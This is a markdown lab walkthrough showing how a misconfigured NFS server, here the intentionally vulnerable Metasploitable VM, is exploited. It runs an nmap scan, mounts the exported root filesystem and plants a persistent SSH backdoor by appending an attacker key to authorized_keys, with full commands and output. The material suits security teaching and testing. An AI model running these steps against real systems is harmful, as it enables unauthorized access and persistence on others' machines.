# NFS (Network File System) Exploit

## Introduction

The Network File System protocol allows you to mount a system/directory of a remote server over a network on your own device much like a local storage would.

NFS usually only allow a specific IP to access some specific directory but if it is badly configured everyone can have access to the remote machine.

The following command can tell you if there is any exported directories oby the NFS server.
```console
kali@kali:~$ showmount -e 192.168.2.212
Export list for 192.168.2.212:
/nfsshare 192.168.2.101
```

In this case the remote server with IP 192.168.2.212 has the ‘/nfsshare‘ directory open for IP 192.168.2.101.

In our case we will see how to exploit a misconfigured NFS server which would display something like this when using the same command :
```console
kali@kali:~$ showmount -e 192.168.2.212
Export list for 192.168.2.212:
/ *
```

This tells us that the root directory is available to any IP address.

## Setup

For this exploit we will need an additional Virtual Machine to act as the NFS Server. We will be using the Metasploitable VM that is specificly designed to have many vulnerabilities.

(Link to metasploit)[#]

Once you have downloaded the image you can mount it on a 64-bit Ubuntu version. 

Launch Metasploitable and try to log in using the following creditentials

- username : `msfadmin`
- password : `msfadmin`

*The default keyboard layout is US so be carefull*

The next thing you need to do is to change the default network settings on both your Kali and Metasploitable VMs.

For each VM in Virtualbox go to Settings -> Networks and change NAT for Bridged networking. This will allow Kali to communicate with the other VM and vice-versa.

## Exploit

The first thing we need to do is fetch the target's IP address. In my case it is 192.168.2.212 .

Using `nmap` we can scan a remote IP address to see if there are any open ports :
```console
kali@kali:~$ nmap -p0-65535 192.168.2.212
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 13:13 EDT
Nmap scan report for 192.168.2.212
Host is up (0.0038s latency).
Not shown: 65505 closed ports
PORT      STATE    SERVICE
0/tcp     filtered unknown
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    open     telnet
25/tcp    open     smtp
53/tcp    open     domain
80/tcp    open     http
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
512/tcp   open     exec
513/tcp   open     login
514/tcp   open     shell
1099/tcp  open     rmiregistry
1524/tcp  open     ingreslock
2049/tcp  open     nfs
2121/tcp  open     ccproxy-ftp
3306/tcp  open     mysql
3632/tcp  open     distccd
5432/tcp  open     postgresql
5900/tcp  open     vnc
6000/tcp  open     X11
6667/tcp  open     irc
6697/tcp  open     ircs-u
8009/tcp  open     ajp13
8180/tcp  open     unknown
8787/tcp  open     msgsrvr
39804/tcp open     unknown
51060/tcp open     unknown
53327/tcp open     unknown
57207/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 5.30 seconds
```
We can see that there are a lot of open ports on this machine as well as the default port for nfs : 2049.

So we now that NFS is running so let's check what directories can be mounted using the previously used command : 
```console
kali@kali:~$ showmount -e 192.168.2.212
Export list for 192.168.2.212:
/ *
```

This is bad.. But this is something we can exploit ! We will create a new directory on our Kali machine and mount the remote directory.

```console
kali@kali:~$ mkdir /tmp/access
kali@kali:~$ mount -t nfs 192.168.2.212:/ /tmp/access/
```
This will mount the root directory of 192.168.2.212 on our /tmp/access/ directory using NFS as file system.

We can check that it is indeed mounted using the following command `df -k`:
```console
kali@kali:~$ df -k
Filesystem      1K-blocks    Used Available Use% Mounted on
udev               972680       0    972680   0% /dev
tmpfs              199768     980    198788   1% /run
/dev/sda1        79980100 8847436  67026888  12% /
tmpfs              998836       0    998836   0% /dev/shm
tmpfs                5120       0      5120   0% /run/lock
tmpfs              998836       0    998836   0% /sys/fs/cgroup
tmpfs              199764     152    199612   1% /run/user/1000
192.168.2.212:/   7282176 1383680   5531392  21% /tmp/access
```

Perfect ! Now you should be able to move to the `/tmp/access` directory and list all the files on the remote machine.

### Backdoor
That's good but we want an easy access to the machine by logging in as a user. If you go to the `/tmp/access/home` you can see that there is a user called msfadmin which we assume we don't know the password.
We have see before that the SSH is open so we can use it to create a backdoor. Go to `/tmp/access/home/msfadmin/.ssh` and list all the files over there.
```console
kali@kali:/tmp/access/home/msfadmin/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```
Perfect ! We can use the `authorized_keys` file to append our own ssh public key and access this user easily.

First we need to generate a new ssh key on our Kali machine.
```console
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): nfs_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in nfs_rsa
Your public key has been saved in nfs_rsa.pub
```

Go back to the remote `.ssh` folder and append your public key to the `authorized_keys`file :
```console
kali@kali:/tmp/access/home/msfadmin/.ssh$ cat /home/kali/nfs_rsa.pub >> authorized_keys 
```

If everything went well you should now be able to access the remote machine as `msfadmin`.

You can specify the public key to use when using ssh with the flag `-i`.
```console
kali@kali:~$ ssh -i nfs_rsa msfadmin@192.168.2.212
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Thu Jul 23 16:43:59 2020 from 192.168.2.231
msfadmin@metasploitable:~$ whoami
msfadmin
msfadmin@metasploitable:~$ 
```

Tadam !

